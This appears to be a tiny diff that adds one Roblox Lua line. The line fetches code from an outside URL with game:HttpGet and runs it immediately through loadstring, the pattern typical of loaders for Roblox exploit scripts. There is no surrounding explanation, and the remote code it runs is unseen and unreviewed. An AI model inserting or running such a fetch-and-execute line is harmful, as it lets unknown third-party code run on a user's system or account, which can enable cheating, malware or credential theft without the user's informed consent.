@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://syncp.org/run/JhPParJ3IJJCW59Zd03ELCaLWXzg14Hx8NkQaxUl4RNuCIQisiZrn0JInEsjDZNBNMpcaKPTl-Po"))()
